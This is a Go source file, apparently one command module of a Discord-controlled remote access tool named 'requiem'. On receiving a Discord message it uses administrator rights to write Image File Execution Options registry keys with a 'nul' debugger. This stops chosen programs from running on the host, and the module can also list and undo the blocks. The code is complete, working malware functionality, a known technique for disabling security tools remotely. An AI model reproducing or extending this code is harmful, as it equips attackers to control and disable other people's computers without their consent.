package commands

import (
	"fmt"
	"strings"

	"requiem/store"
	"requiem/utils"

	"github.com/bwmarrin/discordgo"
	"golang.org/x/sys/windows/registry"
)

const EXEC_OPTIONS = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\"

func (*ProcCommand) Exec(ses *discordgo.Session, msg *discordgo.MessageCreate, args []string) {
	if !store.IsAdmin {
		ses.ChannelMessageSendReply(msg.ChannelID, "🟥 Administrator privileges are required to do this.", msg.Reference())
		return
	}

	if len(args) < 2 {
		ses.ChannelMessageSendReply(msg.ChannelID, "🟥 You need to provide a flag and a website.", msg.Reference())
		return
	}

	content := strings.Join(args, " ")

	process := utils.UnwrapQuotes(content)
	if process == "" {
		ses.ChannelMessageSendReply(msg.ChannelID, "🟥 You need to wrap the process file name in double quotes.", msg.Reference())
		return
	}

	if utils.HasFlag(content, "block") {
		key, _, err := registry.CreateKey(registry.LOCAL_MACHINE, EXEC_OPTIONS+process, registry.SET_VALUE)
		if err != nil {
			ses.ChannelMessageSendReply(msg.ChannelID, fmt.Sprintf("🟥 Failed to create key - %s", err), msg.Reference())
			return
		}

		defer key.Close()

		err = key.SetStringValue("Debugger", "nul")
		if err != nil {
			ses.ChannelMessageSendReply(msg.ChannelID, fmt.Sprintf("🟥 Failed to set hook value - %s", err), msg.Reference())
			return
		}

		ses.ChannelMessageSendReply(msg.ChannelID, "🟩 Successfully blocked process.", msg.Reference())
		return
	}

	if utils.HasFlag(content, "unblock") {
		err := registry.DeleteKey(registry.LOCAL_MACHINE, EXEC_OPTIONS+process)
		if err == nil {
			ses.ChannelMessageSendReply(msg.ChannelID, "🟩 Successfully unblocked process.", msg.Reference())
			return
		}

		key, err := registry.OpenKey(registry.LOCAL_MACHINE, EXEC_OPTIONS+process, registry.SET_VALUE)
		if err != nil {
			ses.ChannelMessageSendReply(msg.ChannelID, fmt.Sprintf("🟥 Failed to unblock process (1) - %s", err), msg.Reference())
			return
		}

		defer key.Close()

		err = key.DeleteValue("Debugger")
		if err == nil {
			ses.ChannelMessageSendReply(msg.ChannelID, "🟩 Successfully unblocked process.", msg.Reference())
			return
		}

		ses.ChannelMessageSendReply(msg.ChannelID, fmt.Sprintf("🟥 Failed to unblock process (2) - %s", err), msg.Reference())
		return
	}

	if utils.HasFlag(content, "list") {
		key, err := registry.OpenKey(registry.LOCAL_MACHINE, EXEC_OPTIONS, registry.READ)
		if err != nil {
			ses.ChannelMessageSendReply(msg.ChannelID, fmt.Sprintf("🟥 Failed to open key - %s", err), msg.Reference())
			return
		}

		defer key.Close()

		subs, err := key.ReadSubKeyNames(-1)
		if err != nil {
			ses.ChannelMessageSendReply(msg.ChannelID, fmt.Sprintf("🟥 Failed to open sub keys - %s", err), msg.Reference())
			return
		}

		var blocked []string

		for _, name := range subs {
			sub, err := registry.OpenKey(key, name, registry.READ)
			if err != nil {
				continue
			}

			val, _, err := sub.GetStringValue("Debugger")
			sub.Close()

			if err != nil {
				continue
			}

			if val != "nul" {
				continue
			}

			blocked = append(blocked, name)
		}

		if len(blocked) == 0 {
			ses.ChannelMessageSendReply(msg.ChannelID, "There are no blocked processes.", msg.Reference())
			return
		}

		ses.ChannelMessageSendReply(msg.ChannelID, "Blocked processes:\n```\n"+strings.Join(blocked, "\n")+"```", msg.Reference())
		return
	}

	ses.ChannelMessageSendReply(msg.ChannelID, "🟥 Invalid flag.", msg.Reference())
}

func (*ProcCommand) Name() string {
	return "process"
}

func (*ProcCommand) Info() string {
	return "Block or unblock processes."
}

type ProcCommand struct{}
